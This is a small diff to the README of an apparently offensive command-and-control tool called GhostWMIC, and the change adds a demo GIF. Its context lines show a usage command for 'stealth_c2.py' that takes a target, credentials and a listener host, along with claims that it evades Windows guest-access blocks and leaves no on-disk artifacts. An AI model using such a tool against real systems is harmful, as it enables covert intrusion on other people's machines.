@@ -66,6 +66,8 @@ python3 stealth_c2.py <TARGET> <USERNAME> <PASSWORD> --domain <DOMAIN> --lhost <
 - SMB authentication avoids Windows 10/11 guest access blocks
 - No on-disk payloads or artifacts
 
+## 📸 DEMO
+![GhostWMIC Demo](extra/whisper.gif)
 
 
 
